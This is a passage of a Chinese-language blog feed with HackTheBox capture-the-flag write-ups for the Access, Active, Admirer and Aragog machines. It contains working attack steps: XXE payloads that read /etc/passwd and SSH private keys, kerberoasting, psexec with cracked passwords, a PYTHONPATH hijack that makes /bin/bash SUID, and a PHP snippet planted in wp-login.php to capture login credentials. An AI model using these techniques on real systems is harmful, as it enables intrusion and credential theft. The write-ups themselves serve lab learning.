<p>后面发现，直接找敏感的命令，可能会好些，一开始没想到su</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -Ri &#39;comm&#x3D;&quot;su&quot;&#39;</span><br></pre></td></tr></table></figure>

<p><code>6D7262336E5F41634064336D79210A</code>看样子是hex编码后的内容，尝试解码得到<code>mrb3n_Ac@d3my!</code>，不过密码不是uid1002的，而是</p>
<p><code>mrb3n/mrb3n_Ac@d3my!</code></p>
<p><img src="/images/Academy/16.png" alt="16"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>root反而简单了，直接找到了sudo命令composer</p>
<p><img src="/images/Academy/17.png" alt="17"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最耗时间的地方在横向移动到第二个用户的时候，日志太多，不熟悉的情况下，不确定是否应该花费大量时间去寻找</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Access</title>
    <url>/2020/10/25/HTB-Access/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Access/1.png" alt="1"></p>
<p>ftp允许匿名访问，下载它的全部内容先</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror --no-passive-ftp &#39;ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.98&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/2.png" alt="2"></p>
<p>nmap没有给出23端口的具体信息，可能知识根据端口号识别出了telnet，应该去手动检查它</p>
<p><img src="/images/Access/3.png" alt="3"></p>
<p>这样才确定了23的telnet服务</p>
<p>80端口啥也没有</p>
<p><img src="/images/Access/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>优先去检查ftp的内容，发现一个<code>back.mdb</code>文件，这是一个Access数据库的文件，另外还有一个zip的压缩包</p>
<p>unzip无法解压</p>
<p><img src="/images/Access/5.png" alt="5"></p>
<p>尝试使用7z</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/6.png" alt="6"></p>
<p>需要密码，查看它的加密类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z l -slt &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/7.png" alt="7"></p>
<p>得到AES-256，7z和WinZip都支持AES-256算法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip2john &#39;Access Control.zip&#39; &gt; hash</span><br><span class="line">john hash</span><br></pre></td></tr></table></figure>

<p>这里无法破解，可能需要一个特殊的字典，有一个偷鸡的方法</p>
<p>使用strings查看Access数据库的文件，发现</p>
<p><img src="/images/Access/8.png" alt="8"></p>
<p>存在一些可读的文本信息，提取出它们，为了减少大小，过滤掉8字符长度以下的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings -n 8 backup.mdb &gt;&#x2F;root&#x2F;Desktop&#x2F;list.txt</span><br></pre></td></tr></table></figure>

<p>使用它们，你可以得到密码，神奇…</p>
<p><img src="/images/Access/9.png" alt="9"></p>
<h2 id="mdb"><a href="#mdb" class="headerlink" title="mdb"></a>mdb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install mdbtools</span><br></pre></td></tr></table></figure>

<p>使用它检查库的表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-sql backup.mdb </span><br><span class="line">1 &#x3D;&gt; list tables</span><br><span class="line">2 &#x3D;&gt; go</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/10.png" alt="10"></p>
<p>或者来查看<code>auth_user</code>表的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-export backup.mdb auth_user</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/11.png" alt="11"></p>
<p>或者讲表内的内容逐一导出到文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir tables</span><br><span class="line">for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i &gt; tables&#x2F;$i; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/12.png" alt="12"></p>
<p>所以可以在表内找到这个解压密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br><span class="line">access4u@security</span><br></pre></td></tr></table></figure>

<h2 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h2><p>解压后发现，是一个微软outlook的文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file &#39;Access Control.pst&#39; </span><br><span class="line">Access Control.pst: Microsoft Outlook email folder (&gt;&#x3D;2003)</span><br></pre></td></tr></table></figure>

<p>可使用readpst转换成.mbox格式，再进行读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install pst-utils</span><br><span class="line">readpst Access\ Control.pst</span><br><span class="line">cat &#39;Access Control.mbox&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/13.png" alt="13"></p>
<p>得到凭据<code>security/4Cc3ssC0ntr0ller</code></p>
<p>这样就能通过telnet获得shell</p>
<p><img src="/images/Access/14.png" alt="14"></p>
<p>想要换一个环境的shell，尝试使用nc，但是会被本地组策略阻止</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This program is blocked by group policy. For more information, contact your system administrator</span><br></pre></td></tr></table></figure>

<p>使用powershell Nishang的InvokeTCP就可以了</p>
<p><img src="/images/Access/16.png" alt="16"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权有点难受，powerup会卡住，winpeas不能用，不过练练手动枚举也挺好</p>
<p>发现了管理员的Saved Creds</p>
<p><img src="/images/Access/17.png" alt="17"></p>
<p>通过它可以随心所欲，无视本地策略组了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:Administrator &quot;.\shell.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/18.png" alt="18"></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><code>powerup</code>无法使用，但是<code>jaws</code>可以使用，使用它可以得到相同的结果</p>
<p><img src="/images/Access/19.png" alt="19"></p>
<p>为什么这里会有存储的凭据，可能是管理员希望某个程序能够以管理员身份运行，配置了/savecred<br>在windows中无法为单个程序设置使用/savecred，所以能够以runas运行任何命令<br>通常/savecred runas用于创建快捷方式，让用户以高权限运行，可以在进行<code>.lnk</code>快捷方式的枚举，发现是否存在runas命令，不过好像只有GUI下可以运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\&quot; *.lnk -Recurse -Force | ft fullname |Out-File shortcuts.txt</span><br><span class="line">ForEach($file in gc .\shortcuts.txt) &#123; Write-Output $file; gc $file |Select-String runas &#125;</span><br></pre></td></tr></table></figure>

<p>这样可以发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk</span><br></pre></td></tr></table></figure>

<p>可以使用powershell来获取快捷方式的详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$WScript&#x3D;New-Object -ComObject  WScript.Shell</span><br><span class="line">$shortcut&#x3D;Get-ChildItem *.lnk</span><br><span class="line">$WScript.CreateShortcut($shortcut)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FullName         : C:\Users\public\Desktop\ZKAccess3.5 Security System.lnk</span><br><span class="line">Arguments        : &#x2F;user:ACCESS\Administrator &#x2F;savecred &quot;C:\ZKTeco\ZKAccess3.5\</span><br><span class="line">                   Access.exe&quot;</span><br><span class="line">Description      : </span><br><span class="line">Hotkey           : </span><br><span class="line">IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0</span><br><span class="line">RelativePath     : </span><br><span class="line">TargetPath       : C:\Windows\System32\runas.exe</span><br><span class="line">WindowStyle      : 1</span><br><span class="line">WorkingDirectory : C:\ZKTeco\ZKAccess3.5</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Active</title>
    <url>/2020/07/02/HTB-Active/</url>
    <content><![CDATA[<p>域渗透相关机器，利用了windows server 2008中gpp存储密码的安全风险</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/Active/1.jpg" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>53和636端口提示了host</p>
<p><img src="/images/Active/2.jpg" alt="2"></p>
<p>smb目录枚举</p>
<p><img src="/images/Active/3.jpg" alt="3"></p>
<p>发现Replication可读</p>
<p><img src="/images/Active/4.jpg" alt="4"></p>
<p>快速枚举出文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -R Replication --depth 10</span><br></pre></td></tr></table></figure>

<p><img src="/images/Active/5.jpg" alt="5"></p>
<p>发现了策略组文件Groups.xml<br>把它给下载下来</p>
<p><img src="/images/Active/6.jpg" alt="6"></p>
<p>在其中发现加密密码和域名active.htb\SVC_TGS</p>
<p><img src="/images/Active/7.jpg" alt="7"></p>
<p>使用gpp-decrypt解密，得到GPPstillStandingStrong2k18</p>
<p>利用这个密码枚举域用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetADUsers.py -all active.htb&#x2F;svc_tgs -dc-ip 10.10.10.100</span><br><span class="line">GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p><img src="/images/Active/8.jpg" alt="8"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>凭据给了我们一个非常好的立足点，这样我们就可以使用<code>GetUserSPNs.py</code>进行kerberoasting攻击了</p>
<p><img src="/images/Active/9.jpg" alt="9"></p>
<p>太好了，当前服务账号为管理员用户，直接用john进行哈希破解，得到Ticketmaster1968</p>
<p>smb连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py administrator:Ticketmaster1968@active.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Active/10.jpg" alt="10"></p>
<p>成功getshell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
        <tag>ActiveDirectory</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Admirer</title>
    <url>/2021/05/19/HTB-Admirer/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Admirer/1.png" alt="1"></p>
<p>nmap发现了<code>robots.txt</code>并提示了路径<code>admin-dir</code>，不过返回了403</p>
<p><img src="/images/Admirer/2.png" alt="2"></p>
<p>首页没有太多有趣的信息，不过在一些手动尝试之后，确定了首页为<code>index.php</code>，所以是一个PHP站点</p>
<p><img src="/images/Admirer/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>手动查看robots.txt，提示了<code>admin-dir</code>下有creds。考虑到该目录访问返回403，所以我决定进一步对该目录进行枚举</p>
<p><img src="/images/Admirer/4.png" alt="4"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.187/admin-dir/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x php,txt -t 25</span><br></pre></td></tr></table></figure>

<p><img src="/images/Admirer/5.png" alt="5"></p>
<p>发现<code>contacts.txt</code></p>
<p><img src="/images/Admirer/6.png" alt="6"></p>
<p>发现<code>credentials.txt</code></p>
<p><img src="/images/Admirer/7.png" alt="7"></p>
<p>使用凭据<code>ftpuser/%n?4Wz&#125;R$tTF7</code>对ftp进行连接</p>
<p><img src="/images/Admirer/8.png" alt="8"></p>
<p>sql文件没有太多有趣的信息，不过html好像是网站的根目录，我们可以通过枚举确定</p>
<p><img src="/images/Admirer/9.png" alt="9"></p>
<p>所以压缩包似乎是网站的备份，检查<code>index.php</code>发现了凭据<code>waldo/]F7jLHw:*G&gt;UPrTo&#125;~A&quot;d6b</code></p>
<p><img src="/images/Admirer/10.png" alt="10"></p>
<p>发现凭据<code>waldo/Wh3r3_1s_w4ld0?</code>位于<code>db_admin.php</code>，应该是数据库的凭据</p>
<p><img src="/images/Admirer/11.png" alt="11"></p>
<p>发现<code>info.php</code>位于<code>utility-scripts</code>，它是一个phpinfo页面</p>
<p><img src="/images/Admirer/14.png" alt="image-20210519224945281"></p>
<p><code>admin_tasks.php</code>接收post请求执行系统命令，不过无法进行命令注入</p>
<p><img src="/images/Admirer/12.png" alt="12"></p>
<p>浏览器访问该页面</p>
<p><img src="/images/Admirer/13.png" alt="13"></p>
<p>由于我们拿到的仅仅是一个压缩包，仅仅可能是网站的备份，可能之后有了跟新，所以我手动检查了每一个页面，确认符合预期。到这里我们获得了足够多的页面和凭据，不过没有任何更多的进展，也就是陷入了死路，这种情况考虑更多的枚举</p>
<p>对子目录<code>utility-scripts</code>进行枚举</p>
<p>​    <img src="/images/Admirer/16.png" alt="16"></p>
<p>发现<code>adminer.php</code></p>
<p><img src="/images/Admirer/15.png" alt="15"></p>
<p>尝试输入之前获得的大量凭据，大部分都提示权限问题，当我输入我自己的ip时，捕获到了连接请求</p>
<p><img src="/images/Admirer/17.png" alt="17"></p>
<p>所以我要调整mysql，使连接成功，登录进去再说</p>
<p>修改默认监听本地端口为监听外部端口，即<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind-address            &#x3D; 0.0.0.0</span><br></pre></td></tr></table></figure>

<p><img src="/images/Admirer/18.png" alt="18"></p>
<p>创建一个临时数据表和账户用于此次连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql -u root -proot</span><br><span class="line">MariaDB [(none)]&gt; CREATE DATABASE hackthebox;</span><br><span class="line">MariaDB [(none)]&gt; CREATE USER &#x27;arsene&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO &#x27;arsene&#x27;@&#x27;%&#x27;;</span><br><span class="line">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br><span class="line">MariaDB [(none)]&gt; use hackthebox;</span><br><span class="line">MariaDB [(none)]&gt; create table test(data VARCHAR(255));</span><br></pre></td></tr></table></figure>

<p>现在我们可以使用它进行登录</p>
<p><img src="/images/Admirer/19.png" alt="19"></p>
<p>登录成功，并且提供了执行sql语句的功能</p>
<p><img src="/images/Admirer/20.png" alt="20"></p>
<p>通过之前的phpinfo页面发现了<code>mysqli.allow_local_infile</code>处于开启，也就说我们应该可以通过<code>load data infile</code>将文件内容插入表中，来完成文件读取</p>
<p><img src="/images/Admirer/21.png" alt="21"></p>
<p>不过需要注意，<code>open_basedir</code>限制只能读取web界面</p>
<p><img src="/images/Admirer/22.png" alt="22"></p>
<p>由于我在使用MariaDB，<code>local_infile</code>默认是关闭的，所以需要先打开它</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> local_infile = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">select</span> VARIABLE_NAME,VARIABLE_VALUE <span class="keyword">from</span> information_schema.global_variables <span class="keyword">where</span> variable_name=<span class="string">&quot;local_infile&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Admirer/23.png" alt="23"></p>
<p>之后尝试执行sql语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> hackthebox.test <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<p>预期性的得到限制，因为<code>open_basedir</code></p>
<p><img src="/images/Admirer/24.png" alt="24"></p>
<p>这里可以想到读取web目录下真实<code>index.php</code>，因为我们之前在疑似备份压缩包里的这个文件发现了凭据，不过没起到作用，所以尝试读取它</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">&#x27;/var/www/html/index.php&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> hackthebox.test <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<p>看起来执行成功了，我们获得了123行</p>
<p><img src="/images/Admirer/25.png" alt="25"></p>
<p>可以在网页上直接查看，或者在本地数据库里看也是一回事</p>
<p><img src="/images/Admirer/26.png" alt="26"></p>
<p>所以我们得到了凭据<code>waldo/&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;</code>，尝试ssh，成功获得shell</p>
<p><img src="/images/Admirer/27.png" alt="27"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用密码查看sudo权限，发现了一个shell脚本，被设置了<code>SETENV</code>。也就是<code>sudoers</code>里写成了类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">USERNAME ALL&#x3D;(ALL) SETENV:&#x2F;opt&#x2F;scripts&#x2F;admin_tasks.sh</span><br><span class="line">%GROUPNAME ALL&#x3D;(ALL) SETENV:&#x2F;opt&#x2F;scripts&#x2F;admin_tasks.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Admirer/28.png" alt="28"></p>
<p>在查看/opt/scripts目录发现了<code>backup.py</code></p>
<p><img src="/images/Admirer/29.png" alt="29"></p>
<p>在<code>admin_tasks.sh</code>里发现了backup_web函数，它会调用<code>backup.py</code></p>
<p><img src="/images/Admirer/30.png" alt="30"></p>
<p>这里两个文件都不可写，所以这里主要理解SETENV，它允许我们使用sudo来修改环境变量，这会造成PATH劫持</p>
<p>这里sudo能够使用的程序是<code>admin_tasks.sh</code>，它会调用<code>backup.py</code>，所以利用backup.py，我们可以劫持<code>shutil.py</code>的<code>make_archive</code>函数。</p>
<p>如何修改python库的路径，通过查看<a href="https://docs.python.org/3.8/using/cmdline.html#environment-variables">链接</a>得知，可以通过设置环境变量<code>PYTHONPATH</code>。<code>PYTHONPATH</code>平常使用不用设置，因为它会默认去找到python执行程序的位置，然后去寻找库文件，所以这个环境变量的真正意义就是让你可以在全局额外设置某个目录来放置Python库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vi /tmp/shutil.py</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_archive</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        os.system(<span class="string">&#x27;chmod +s /bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>之后sudo执行bash脚本即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<p><img src="/images/Admirer/31.png" alt="31"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Aragog</title>
    <url>/2021/06/01/HTB-Aragog/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Aragog/1.png" alt="1"></p>
<p>FTP允许匿名登陆，没有太有趣的文件</p>
<p><img src="/images/Aragog/2.png" alt="2"></p>
<p>Web枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.78&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-medium-directories.txt -n -x php html</span><br></pre></td></tr></table></figure>

<p><img src="/images/Aragog/3.png" alt="3"></p>
<p>发现了<code>hosts.php</code></p>
<p><img src="/images/Aragog/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>我们发现<code>hosts.php</code>疑似缺少一些参数，考虑到ftp里发现了XML文件，尝试发送POST请求给该接口</p>
<p>成功得到响应</p>
<p><img src="/images/Aragog/5.png" alt="5"></p>
<p>尝试修改参数，发现可以随意控制</p>
<p><img src="/images/Aragog/6.png" alt="6"></p>
<p>可以猜到后台会读取我们传递的XML文件，这里考虑XXE漏洞</p>
<p>尝试传递payload验证漏洞存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;evil&quot;&gt; ]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;example;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Aragog/7.png" alt="7"></p>
<p>看来XXE漏洞存在，尝试引入外部DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE evil[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Aragog/8.png" alt="8"></p>
<p>可以进行文件读取</p>
<p>有了文件读取，我首先想要做的是读取当前页面的源代码，因为它是PHP站点，可以使用<code>php filter</code>进行源码获取，尝试猜测网站页面位置为<code>/var/www/html/hosts.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE evil[</span><br><span class="line">&lt;!ELEMENT evil ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;hosts.php&quot;&gt;]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Aragog/9.png" alt="9"></p>
<p>解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $details = simplexml_import_dom($dom);</span><br><span class="line">    $mask = $details-&gt;subnet_mask;</span><br><span class="line">    <span class="comment">//echo &quot;\r\nYou have provided subnet $mask\r\n&quot;;</span></span><br><span class="line"></span><br><span class="line">    $max_bits = <span class="string">&#x27;32&#x27;</span>;</span><br><span class="line">    $cidr = mask2cidr($mask);</span><br><span class="line">    $bits = $max_bits - $cidr;</span><br><span class="line">    $hosts = pow(<span class="number">2</span>,$bits);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\r\nThere are &quot;</span> . ($hosts - <span class="number">2</span>) . <span class="string">&quot; possible hosts for <span class="subst">$mask</span>\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mask2cidr</span>(<span class="params">$mask</span>)</span>&#123;  </span><br><span class="line">         $long = ip2long($mask);  </span><br><span class="line">         $base = ip2long(<span class="string">&#x27;255.255.255.255&#x27;</span>);  </span><br><span class="line">         <span class="keyword">return</span> <span class="number">32</span>-log(($long ^ $base)+<span class="number">1</span>,<span class="number">2</span>);       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里使用DOMDocument(基于libxml库)解析XML，没有进行任何限制，导致XXE漏洞</p>
<p>xxe一般很难获取RCE，比如php默认禁用的<code>expect</code>，所以我们尝试读取一些能获得shell的文件，比如<code>id_rsa</code></p>
<p>选出之前passwd中的普通用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat passwd |grep -vE &quot;false|nologin&quot; | awk -F &quot;:&quot; &#39;&#123;print $1&#125;&#39;</span><br><span class="line">sync</span><br><span class="line">florian</span><br><span class="line">cliff</span><br></pre></td></tr></table></figure>

<p>使用一个for循环快速遍历所有用户的id_rsa</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for name in $(echo sync florian cliff);do curl -s http:&#x2F;&#x2F;10.10.10.78&#x2F;hosts.php -x http:&#x2F;&#x2F;127.0.0.1:8080 -d &#39;&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE evil[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;&#x2F;home&#x2F;&#39;$name&#39;&#x2F;.ssh&#x2F;id_rsa&quot;&gt;]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;&#39;;done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Aragog/10.png" alt="10"></p>
<p>使用私钥登陆即可</p>
<p><img src="/images/Aragog/11.png" alt="11"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现Web目录可以任意读写，这是不寻常的</p>
<p><img src="/images/Aragog/12.png" alt="12"></p>
<p>发现两个目录枚举没有发现的东西</p>
<p><img src="/images/Aragog/13.png" alt="13"></p>
<p>其中一个是wordpress站点，另一个不具有读写权限。添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.78     aragog</span><br></pre></td></tr></table></figure>

<p>wordpress站点得到blog，解释了zz_backup有可能是网站的备份</p>
<p><img src="/images/Aragog/14.png" alt="14"></p>
<p>由于这是<code>wordpress</code>，所以可以从<code>wp-config.php</code>中得到mysql密码</p>
<p><img src="/images/Aragog/15.png" alt="15"></p>
<p>得到管理员密码</p>
<p><img src="/images/Aragog/16.png" alt="16"></p>
<p>不过该哈希无法破解</p>
<p>使用pspy寻找可疑的进程</p>
<p><img src="/images/Aragog/17.png" alt="17"></p>
<p>发现进程<code>wp-login.py</code>，看起来该脚本像有人在不断尝试登陆，当前用户没有<code>tcpdump</code>的执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">florian@aragog:&#x2F;var&#x2F;www&#x2F;html&#x2F;dev_wiki$ tcpdump </span><br><span class="line">tcpdump: ens33: You don&#39;t have permission to capture on that device</span><br><span class="line">(socket: Operation not permitted)</span><br></pre></td></tr></table></figure>

<p>但具有修改<code>wordpress</code>下文件的权限，所以我决定在<code>wp-login.php</code>中添加如下内容，这样我就可以抓取登陆的凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$content&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">file_put_contents(&quot;&#x2F;tmp&#x2F;cred.txt&quot;,$content,FILE_APPEND);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Aragog/18.png" alt="18"></p>
<p>成功抓取到</p>
<p><img src="/images/Aragog/19.png" alt="19"></p>
<p>解码</p>
<p><img src="/images/Aragog/20.png" alt="20"></p>
<p>这就是root的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">florian@aragog:&#x2F;tmp$ su root</span><br><span class="line">Password: !KRgYs(JFO!&amp;MTr)lf</span><br><span class="line">root@aragog:&#x2F;tmp# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@aragog:&#x2F;tmp# </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
